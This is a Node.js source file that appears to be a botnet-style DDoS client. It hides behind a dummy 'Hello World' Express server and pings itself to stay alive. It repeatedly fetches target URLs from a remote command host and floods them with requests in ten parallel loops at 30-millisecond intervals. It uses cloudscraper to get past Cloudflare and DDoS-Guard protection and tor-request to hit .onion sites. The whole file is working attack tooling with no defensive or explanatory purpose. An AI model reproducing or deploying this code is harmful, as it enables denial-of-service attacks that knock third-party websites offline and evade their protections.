console.log("ok");
process.on('uncaughtException', function(err) {
});
var express = require('express');
var app = express();
app.get('/', function (req, res) {
  res.send('Hello World!');
});
app.listen(3000, function (req,res,next) {});
console.log("ok");
const request = require('request');
const cloudscraper = require('cloudscraper');
const dns = require('dns');
const cloudflareIp = require('cloudflare-ip');
const tor_request = require('tor-request');
global.target = "0";
global.targettype = "normal";

function uptime(){
  request('http://localhost:3000', (error, response, body) => {
    if( error !== null ){}
  });
  setTimeout(function (){
    uptime();
  },5000);
}

function atk(){
  var targettype = global.targettype;
  var target = global.target;
  if (target == "0"){
  setTimeout(function (){
    atk(target);
  },5000);
  return;
  }
  if (global.targettype == "normal"){
//  setTimeout(function () {
  request(target, (error, response, body) => {
    if( error !== null ){}
  });
//  },1);
  console.log("run(type normal)");
  console.log(target);
  }else　if(global.targettype == "cloudflare"){
//  setTimeout(function () {
    cloudscraper.get(target).then(function (){},function (){}).catch();
//  },1);
  console.log("run(type cloudflare)");
  console.log(target);
  }else　if(global.targettype == "unknown"){
//  setTimeout(function () {
    cloudscraper.get(target).then().catch();
//  },1);
  console.log("run(type unknown)");
  console.log(target);
  }else　if(global.targettype == "ddos-guard"){
//  setTimeout(function () {
    cloudscraper.get(target).then().catch();
//  },1);
  console.log("run(type ddos-guard)");
  console.log(target);
  }else if(global.targettype == "tor"){
    tor_request.request(target);
  console.log("run(type tor-開発中)");
  console.log(target);
  }
  setTimeout(function (){
    atk(target);
  },30);
};


function gettarget(){
  request('https://api.midokuriserver.com/temp/tempindex.html', (error, response, body) => {
  // エラーチェック
    if( error !== null ){}else{
      body = body.split(',');
      body = body[Math.floor(Math.random() *   body.length)];
      global.target = body;
    }
    setTimeout(function (){
      gettarget();
    },10000);
    if (global.target != "0"){
      try{
        var domain = global.target.match(/^https?:\/{2,}(.*?)(?:\/|\?|#|$)/)[1];
      }catch(e){return}
      if (domain.endsWith('.onion')){
        global.targettype = 'tor';
        return true;
      }
      else
      {
        global.targettype = 'normal';
      }
      dns.resolve4(domain, (err, address, family) => {
        if (error != null){
          global.targettype == 'unknown';
          return true;
        }
/*
  var cfdetects = 0;
  var cloudflareips = ["104.24.102.88","172.67.204.27","104.24.103.88"];
  cloudflareips.forEach(cfip => {
    if (address != undefined){
      if (address[0] == cfip){
        global.targettype = "cloudflare";
        cfdetects = cfdetects + 1;
      }
    }
  });
  if (cfdetects == 0){
    global.targettype = "normal";
  }
  */
        if (global.targettype != 'tor'){
          if (address != undefined){
            address.forEach(addr => {
              if (cloudflareIp(addr)){
                global.targettype = 'cloudflare';
              }
              if (addr == "185.178.208.175"){
                global.targettype = 'ddos-guard';
              }
            });
          }
        }
      });
    };
  });
};
uptime();
gettarget();
setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);setTimeout(function (){atk();},0);
